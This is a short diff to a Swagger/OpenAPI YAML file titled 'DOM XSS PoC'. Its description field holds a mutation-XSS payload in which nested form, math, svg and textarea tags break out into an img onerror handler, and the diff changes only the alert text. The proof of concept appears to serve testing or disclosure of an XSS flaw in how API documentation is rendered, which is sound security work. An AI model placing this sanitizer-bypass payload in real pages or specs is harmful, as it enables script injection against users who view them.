@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: DOM XSS PoC
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS PoC') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>"></form>
   version: production
 basePath: /api/v1/
 produces:
